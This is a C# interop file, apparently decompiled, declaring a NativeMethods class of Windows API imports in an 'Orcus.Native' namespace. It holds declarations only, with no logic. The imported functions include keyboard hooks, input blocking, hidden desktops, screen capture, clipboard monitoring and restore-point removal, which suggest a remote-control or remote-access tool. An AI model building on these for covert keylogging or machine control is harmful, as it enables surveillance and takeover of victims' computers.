using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using Orcus.Native.Display;
using Orcus.Native.Shell;
using ShellDll;

namespace Orcus.Native;

internal static class NativeMethods
{
	internal delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

	internal delegate bool EnumThreadProc(IntPtr hwnd, IntPtr lParam);

	internal delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

	internal delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

	internal delegate bool EnumDesktopProc(string lpszDesktop, IntPtr lParam);

	internal delegate bool EnumDesktopWindowsProc(IntPtr desktopHandle, IntPtr lParam);

	internal delegate int WindowEnumProc(IntPtr hwnd, IntPtr lparam);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool CryptCreateHash(IntPtr hProv, ALG.ALG_ID algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool CryptDestroyHash(IntPtr hHash);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto)]
	internal static extern int RegOpenKeyEx(UIntPtr hKey, string subKey, uint ulOptions, uint samDesired, out IntPtr hkResult);

	[DllImport("advapi32")]
	internal static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle);

	[DllImport("advapi32", CharSet = CharSet.Auto)]
	internal static extern bool GetTokenInformation(IntPtr hToken, TOKEN_INFORMATION_CLASS tokenInfoClass, IntPtr TokenInformation, int tokeInfoLength, ref int reqLength);

	[DllImport("advapi32", CharSet = CharSet.Auto)]
	internal static extern bool ConvertSidToStringSid(IntPtr pSID, [In][Out][MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);

	[DllImport("advapi32", CharSet = CharSet.Auto)]
	internal static extern bool ConvertStringSidToSid([In][MarshalAs(UnmanagedType.LPTStr)] string pStringSid, ref IntPtr pSID);

	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("gdi32.dll")]
	internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

	[DllImport("gdi32.dll")]
	internal static extern bool DeleteDC([In] IntPtr hdc);

	[DllImport("gdi32.dll")]
	internal static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);

	[DllImport("gdi32.dll")]
	internal static extern IntPtr CreateCompatibleDC(IntPtr hDC);

	[DllImport("gdi32.dll")]
	internal static extern bool DeleteObject(IntPtr hObject);

	[DllImport("gdi32.dll")]
	public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjSource, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

	[DllImport("iphlpapi.dll", SetLastError = true)]
	internal static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TCP_TABLE_CLASS tblClass, int reserved);

	[DllImport("iphlpapi.dll", SetLastError = true)]
	internal static extern uint GetExtendedUdpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, UDP_TABLE_CLASS tblClass, int reserved);

	[DllImport("kernel32")]
	internal static extern ulong GetTickCount64();

	[DllImport("kernel32.dll")]
	internal static extern uint GetTickCount();

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool GlobalMemoryStatusEx([In][Out] MEMORYSTATUSEX lpBuffer);

	[DllImport("kernel32", SetLastError = true)]
	internal static extern IntPtr LoadLibrary(string libraryName);

	[DllImport("kernel32", SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr hwnd, string procedureName);

	[DllImport("kernel32.dll", SetLastError = true)]
	internal static extern void GetSystemInfo(ref SYSTEM_INFO lpSystemInfo);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	internal static extern bool FreeLibrary(IntPtr hModule);

	[DllImport("kernel32.dll")]
	internal static extern int GetSystemDefaultLCID();

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern bool CreateProcess([MarshalAs(UnmanagedType.LPTStr)] string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, [MarshalAs(UnmanagedType.LPTStr)] string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

	[DllImport("kernel32.dll")]
	internal static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

	[DllImport("kernel32.dll")]
	internal static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll")]
	internal static extern uint SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll")]
	internal static extern int ResumeThread(IntPtr hThread);

	[DllImport("kernel32.dll", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32")]
	internal static extern IntPtr GetCurrentProcess();

	[DllImport("kernel32.dll")]
	internal static extern uint GetCompressedFileSizeW([In][MarshalAs(UnmanagedType.LPWStr)] string lpFileName, [MarshalAs(UnmanagedType.U4)] out uint lpFileSizeHigh);

	[DllImport("kernel32.dll", SetLastError = true)]
	internal static extern int GetDiskFreeSpaceW([In][MarshalAs(UnmanagedType.LPWStr)] string lpRootPathName, out uint lpSectorsPerCluster, out uint lpBytesPerSector, out uint lpNumberOfFreeClusters, out uint lpTotalNumberOfClusters);

	[DllImport("setupapi.dll", CharSet = CharSet.Auto)]
	internal static extern IntPtr SetupDiGetClassDevs(ref Guid ClassGuid, IntPtr Enumerator, IntPtr hwndParent, DiGetClassFlags Flags);

	[DllImport("setupapi.dll", SetLastError = true)]
	internal static extern bool SetupDiEnumDeviceInfo(IntPtr DeviceInfoSet, uint MemberIndex, ref SP_DEVINFO_DATA DeviceInfoData);

	[DllImport("setupapi.dll", SetLastError = true)]
	internal static extern bool SetupDiDestroyDeviceInfoList(IntPtr DeviceInfoSet);

	[DllImport("setupapi.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern bool SetupDiGetDeviceRegistryProperty(IntPtr deviceInfoSet, ref SP_DEVINFO_DATA deviceInfoData, SPDRP property, out uint propertyRegDataType, StringBuilder propertyBuffer, uint propertyBufferSize, out uint requiredSize);

	[DllImport("setupapi.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool SetupDiSetClassInstallParams(IntPtr deviceInfoSet, [In] ref SP_DEVINFO_DATA deviceInfoData, [In] ref PropertyChangeParameters classInstallParams, int classInstallParamsSize);

	[DllImport("setupapi.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool SetupDiCallClassInstaller(DiFunction installFunction, IntPtr deviceInfoSet, [In] ref SP_DEVINFO_DATA deviceInfoData);

	[DllImport("shell32.dll")]
	internal static extern bool SHGetSpecialFolderPath(IntPtr hwndOwner, [Out] StringBuilder lpszPath, int nFolder, bool fCreate);

	[DllImport("shell32.dll")]
	internal static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, SHGFI uFlags);

	[DllImport("shell32.dll", CharSet = CharSet.Unicode)]
	internal static extern IntPtr SHGetLocalizedName(string pszPath, StringBuilder pszResModule, ref uint cch, out int pidsRes);

	[DllImport("shell32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	internal static extern int SHCreateItemFromParsingName([MarshalAs(UnmanagedType.LPWStr)] string path, IntPtr pbc, ref Guid riid, [MarshalAs(UnmanagedType.Interface)] out IShellItem shellItem);

	[DllImport("user32.dll")]
	internal static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

	[DllImport("user32.dll")]
	internal static extern int EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);

	[DllImport("user32.dll")]
	internal static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags);

	[DllImport("user32.dll")]
	internal static extern IntPtr FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	internal static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

	[DllImport("user32.dll")]
	internal static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	internal static extern IntPtr SendMessageW(IntPtr hWnd, uint Msg, IntPtr wParam, [MarshalAs(UnmanagedType.LPWStr)] string lParam);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, StringBuilder lParam);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);

	[DllImport("user32.dll")]
	internal static extern IntPtr LoadKeyboardLayout(string pwszKLID, uint Flags);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);

	[DllImport("user32.dll")]
	internal static extern IntPtr FindWindowEx(IntPtr parentHwnd, IntPtr childAfterHwnd, IntPtr className, string windowText);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern ushort GetKeyboardLayout([In] int idThread);

	[DllImport("user32.dll")]
	internal static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern bool EnumThreadWindows(int threadId, EnumThreadProc pfnEnum, IntPtr lParam);

	[DllImport("user32.dll")]
	internal static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);

	[DllImport("user32.dll")]
	internal static extern IntPtr GetShellWindow();

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

	[DllImport("user32.dll")]
	internal static extern IntPtr GetDlgItem(IntPtr hDlg, int nIDDlgItem);

	[DllImport("user32.dll")]
	internal static extern bool SetCursorPos(int x, int y);

	[DllImport("user32.dll")]
	internal static extern uint SendInput(uint nInputs, [In][MarshalAs(UnmanagedType.LPArray)] INPUT[] pInputs, int cbSize);

	[DllImport("user32.dll")]
	internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

	[DllImport("user32.dll")]
	internal static extern int SwapMouseButton(int bSwap);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	internal static extern short GetKeyState(int vKey);

	[DllImport("user32")]
	internal static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpbKeyState, byte[] lpwTransKey, uint fuState);

	[DllImport("user32.dll")]
	internal static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, [Out] StringBuilder lpChar, uint uFlags);

	[DllImport("user32")]
	internal static extern int GetKeyboardState(byte[] pbKeyState);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll")]
	internal static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll")]
	internal static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool UnhookWinEvent(IntPtr hWinEventHook);

	[DllImport("user32.dll")]
	internal static extern bool GetCursorInfo(out CURSORINFO pci);

	[DllImport("user32.dll")]
	internal static extern IntPtr CopyIcon(IntPtr hIcon);

	[DllImport("user32.dll")]
	internal static extern bool GetIconInfo(IntPtr hIcon, out ICONINFO piconinfo);

	[DllImport("user32.dll")]
	internal static extern int SetWindowText(IntPtr hWnd, string text);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool CloseDesktop(IntPtr hDesktop);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

	[DllImport("user32.dll")]
	internal static extern IntPtr OpenInputDesktop(int dwFlags, bool fInherit, long dwDesiredAccess);

	[DllImport("user32.dll")]
	internal static extern bool SwitchDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	internal static extern IntPtr GetThreadDesktop(int dwThreadId);

	[DllImport("user32.dll")]
	internal static extern IntPtr GetProcessWindowStation();

	[DllImport("user32.dll")]
	internal static extern bool EnumDesktops(IntPtr hwinsta, EnumDesktopProc lpEnumFunc, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc lpfn, IntPtr lParam);

	[DllImport("user32.dll")]
	internal static extern int GetWindowText(IntPtr hWnd, IntPtr lpString, int nMaxCount);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool SetThreadDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	internal static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, IntPtr pvInfo, int nLength, ref int lpnLengthNeeded);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool PostMessage(HandleRef hWnd, WM Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, SetWindowPosFlags uFlags);

	[DllImport("user32.dll")]
	internal static extern bool EnumChildWindows(IntPtr hwnd, WindowEnumProc func, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool DestroyIcon(IntPtr hIcon);

	[DllImport("User32.dll")]
	internal static extern bool IsImmersiveProcess(IntPtr hProcess);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool SetForegroundWindow(IntPtr hWnd);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool ShowWindow(IntPtr hWnd, ShowWindowCommands nCmdShow);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool IsIconic(IntPtr hWnd);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll")]
	internal static extern int GetDisplayConfigBufferSizes(QUERY_DEVICE_CONFIG_FLAGS flags, out uint numPathArrayElements, out uint numModeInfoArrayElements);

	[DllImport("user32.dll")]
	internal static extern int QueryDisplayConfig(QUERY_DEVICE_CONFIG_FLAGS flags, ref uint numPathArrayElements, [Out] DISPLAYCONFIG_PATH_INFO[] PathInfoArray, ref uint numModeInfoArrayElements, [Out] DISPLAYCONFIG_MODE_INFO[] ModeInfoArray, IntPtr currentTopologyId);

	[DllImport("user32.dll")]
	internal static extern int DisplayConfigGetDeviceInfo(ref DISPLAYCONFIG_TARGET_DEVICE_NAME deviceName);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool GetGUIThreadInfo(uint idThread, ref GUITHREADINFO lpgui);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool GetWindowInfo(IntPtr hwnd, ref WINDOWINFO pwi);

	[DllImport("user32.dll")]
	internal static extern int MapVirtualKey(uint uCode, MapVirtualKeyMapTypes uMapType);

	[DllImport("user32.dll")]
	internal static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DISPLAY_DEVICE lpDisplayDevice, uint dwFlags);

	[DllImport("user32.dll")]
	internal static extern DISP_CHANGE ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, DisplaySettingsFlags dwflags, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool AddClipboardFormatListener(IntPtr hwnd);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool RemoveClipboardFormatListener(IntPtr hwnd);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	[DllImport("msvcrt.dll")]
	internal static extern int memcmp(IntPtr b1, IntPtr b2, long count);

	[DllImport("Srclient.dll")]
	internal static extern int SRRemoveRestorePoint(uint index);

	[DllImport("ntdll.dll")]
	internal static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ProcessBasicInformation processInformation, int processInformationLength, out int returnLength);

	[DllImport("Shlwapi.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern uint AssocQueryString(AssocF flags, AssocStr str, string pszAssoc, string pszExtra, [Out] StringBuilder pszOut, ref uint pcchOut);

	[DllImport("winmm.dll")]
	internal static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

	[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
	internal unsafe static extern IntPtr memcpy(void* dst, void* src, UIntPtr count);
}
